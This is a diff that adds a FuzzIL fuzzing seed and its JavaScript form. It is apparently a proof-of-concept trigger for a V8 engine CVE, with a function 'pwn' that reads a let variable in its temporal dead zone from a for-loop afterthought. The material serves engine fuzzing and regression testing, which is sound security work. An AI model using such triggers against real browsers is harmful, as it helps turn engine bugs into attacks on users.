@@ -1,0 +1,45 @@
+v0 <- BeginPlainFunction -> v1
+    v2 <- CreateNamedVariable 'Map', 'none'
+    v3 <- Construct v2, []
+    v4 <- CreateNamedVariable 'map', 'let', v3
+    v5 <- CallMethod v4, 'delete', [v1]
+EndPlainFunction
+v6 <- BeginPlainFunction -> 
+    BeginForLoopInitializer
+        v7 <- LoadInteger '0'
+    BeginForLoopCondition -> v8
+        v9 <- LoadInteger '1'
+        v10 <- Compare v8, '<', v9
+    BeginForLoopAfterthought v10 -> v11
+        v12 <- CreateNamedVariable 'y', 'none'
+        v13 <- CallFunction v0, [v12]
+    BeginForLoopBody -> v14, v15
+        v16 <- LoadInteger '0'
+        v17 <- Compare v14, '==', v16
+        BeginIf v17 -> v18
+            Continue
+        EndIf
+        v19 <- CreateNamedVariable 'y', 'none'
+    EndForLoop
+    v20 <- LoadUndefined
+    v21 <- CreateNamedVariable 'y', 'let', v20
+EndPlainFunction
+v22 <- CallFunction v6, []
+
+
+function use(a1) {
+    const v3 = new Map();
+    let map = v3;
+    map.delete(a1);
+}
+function pwn() {
+    for (let i8 = 0; i8 < 1; use(y)) {
+        if (i8 == 0) {
+            continue;
+        }
+    }
+    let y;
+}
+pwn();
+
+FuzzIL program written to /v8/fuzzilli/seed_cve2025_2026/test10.fzil
